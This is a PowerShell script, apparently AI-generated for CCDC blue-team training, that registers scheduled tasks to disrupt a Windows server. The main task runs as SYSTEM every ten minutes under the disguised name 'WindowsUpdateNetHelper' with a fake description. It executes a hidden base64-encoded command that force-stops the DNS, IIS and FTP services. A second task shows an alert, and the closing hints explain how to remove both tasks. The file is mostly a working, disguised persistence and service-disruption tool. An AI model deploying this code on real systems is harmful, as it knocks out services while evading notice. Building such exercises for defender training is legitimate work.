# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Task Scheduler - Service Disruption
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# Claude Sonnet 4.6
# "Create a CCDC_Windows_TASKSCHEDULER_TaskMaster.ps1 that stops the dns
# ftp and IIS service on windows every 10 minutes via Task Scheduler."
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

# THIS SCRIPT REGISTERS SCHEDULED TASKS THAT REPEATEDLY STOP SERVICES

#Requires -RunAsAdministrator

# -- Colour helpers ------------------------------------------------------------
function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }

Write-Host ""
Write-Warn  "========================================================"
Write-Warn  " CCDC Blue Team Training  -  Task Scheduler Dropper"
Write-Warn  "========================================================"
Write-Host ""

# =============================================================================
# TASK 1  -  Disguised service killer (every 10 minutes, runs as SYSTEM)
# Stops DNS Server, FTP, and IIS. Disguised as a Windows Update helper task.
#
# Service names (Windows Server 2019+):
#   DNS Server   -> DNS
#   IIS          -> W3SVC  (World Wide Web Publishing Service)
#   FTP (IIS 7+) -> FTPSVC (replaces MSFTPSVC used in IIS 6)
#                   MSFTPSVC also attempted for legacy compat
# =============================================================================

$Task1Name        = "WindowsUpdateNetHelper"
$Task1Description = "Windows Update network connectivity pre-check helper (system managed)"

$Task1ScriptBlock = @'
$services = @('DNS', 'W3SVC', 'FTPSVC', 'MSFTPSVC')
foreach ($svc in $services) {
    try {
        $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
        if ($s -and $s.Status -eq 'Running') {
            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
        }
    } catch {}
}
'@

$Task1Encoded = [Convert]::ToBase64String(
    [System.Text.Encoding]::Unicode.GetBytes($Task1ScriptBlock)
)

$Task1Action = New-ScheduledTaskAction `
    -Execute  "powershell.exe" `
    -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $Task1Encoded"

# -Once + -RepetitionInterval + -RepetitionDuration ([TimeSpan]::MaxValue) is
# the correct pattern on Server 2019+. Without -RepetitionDuration the trigger
# silently expires after ~1 day.
$Task1Trigger = New-ScheduledTaskTrigger `
    -RepetitionInterval  (New-TimeSpan -Minutes 10) `
    -RepetitionDuration  ([System.TimeSpan]::MaxValue) `
    -Once `
    -At (Get-Date).AddSeconds(15)   # fire almost immediately on registration

$Task1Settings = New-ScheduledTaskSettingsSet `
    -ExecutionTimeLimit          (New-TimeSpan -Minutes 5) `
    -RestartCount                3 `
    -RestartInterval             (New-TimeSpan -Minutes 1) `
    -StartWhenAvailable          `
    -RunOnlyIfNetworkAvailable:$false

# SYSTEM account — service is invisible to logged-in users but runs with full
# privilege, which is required to stop protected services like DNS.
$Task1Principal = New-ScheduledTaskPrincipal `
    -UserId    "SYSTEM" `
    -LogonType ServiceAccount `
    -RunLevel  Highest

Write-Info "Registering task: $Task1Name ..."

try {
    Unregister-ScheduledTask -TaskName $Task1Name -Confirm:$false -ErrorAction SilentlyContinue

    Register-ScheduledTask `
        -TaskName    $Task1Name `
        -Action      $Task1Action `
        -Trigger     $Task1Trigger `
        -Settings    $Task1Settings `
        -Principal   $Task1Principal `
        -Description $Task1Description `
        -Force | Out-Null

    Write-Success "Task registered: $Task1Name"
    Write-Success "  Schedule : every 10 minutes"
    Write-Success "  Action   : Stop-Service DNS, W3SVC (IIS), FTPSVC / MSFTPSVC (FTP)"
    Write-Success "  Runs as  : SYSTEM"
} catch {
    Write-Err "Failed to register ${Task1Name}: $_"
}

Write-Host ""

# =============================================================================
# TASK 2  -  Obvious alert task (every 7 minutes, interactive desktop)
# Opens a message box so trainees see the disruption is active.
# Runs as BUILTIN\Users so the dialog appears on the logged-in desktop.
# =============================================================================

$Task2Name        = "SillyServiceKillerAlert"
$Task2Description = "CCDC Training - obvious service-killer alert (find and remove me!)"

$Task2ScriptBlock = @"
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show(
    'SERVICES STOPPED: DNS + IIS + FTP`n`nCheck: Task Scheduler -> TaskMaster tasks`nHint: Get-ScheduledTask | Where-Object TaskName -like ``"Windows*``"',
    'CCDC Blue Team Challenge',
    'OK',
    'Warning'
) | Out-Null
"@

$Task2Encoded = [Convert]::ToBase64String(
    [System.Text.Encoding]::Unicode.GetBytes($Task2ScriptBlock)
)

$Task2Action = New-ScheduledTaskAction `
    -Execute  "powershell.exe" `
    -Argument "-NonInteractive -EncodedCommand $Task2Encoded"

$Task2Trigger = New-ScheduledTaskTrigger `
    -RepetitionInterval  (New-TimeSpan -Minutes 7) `
    -RepetitionDuration  ([System.TimeSpan]::MaxValue) `
    -Once `
    -At (Get-Date).AddSeconds(30)   # stagger slightly from Task 1

$Task2Settings = New-ScheduledTaskSettingsSet `
    -ExecutionTimeLimit          (New-TimeSpan -Minutes 5) `
    -RestartCount                3 `
    -RestartInterval             (New-TimeSpan -Minutes 1) `
    -StartWhenAvailable          `
    -RunOnlyIfNetworkAvailable:$false

# BUILTIN\Users — needed so the WPF message box renders in the interactive
# session rather than invisible Session 0.
$Task2Principal = New-ScheduledTaskPrincipal `
    -GroupId   "BUILTIN\Users" `
    -RunLevel  Highest

Write-Info "Registering task: $Task2Name ..."

try {
    Unregister-ScheduledTask -TaskName $Task2Name -Confirm:$false -ErrorAction SilentlyContinue

    Register-ScheduledTask `
        -TaskName    $Task2Name `
        -Action      $Task2Action `
        -Trigger     $Task2Trigger `
        -Settings    $Task2Settings `
        -Principal   $Task2Principal `
        -Description $Task2Description `
        -Force | Out-Null

    Write-Success "Task registered: $Task2Name"
    Write-Success "  Schedule : every 7 minutes"
    Write-Success "  Action   : WPF MessageBox alert on the interactive desktop"
    Write-Success "  Runs as  : BUILTIN\Users (dialog visible to logged-in users)"
} catch {
    Write-Err "Failed to register ${Task2Name}: $_"
}

Write-Host ""
Write-Warn  "========================================================"
Write-Warn  " Blue team hints:"
Write-Warn  "   Get-ScheduledTask | Where-Object { `$_.TaskName -like 'Windows*' }"
Write-Warn  "   Unregister-ScheduledTask -TaskName 'WindowsUpdateNetHelper' -Confirm:`$false"
Write-Warn  "   Unregister-ScheduledTask -TaskName 'SillyServiceKillerAlert' -Confirm:`$false"
Write-Warn  "========================================================"
Write-Host ""
Write-Success "Task Scheduler dropper complete."
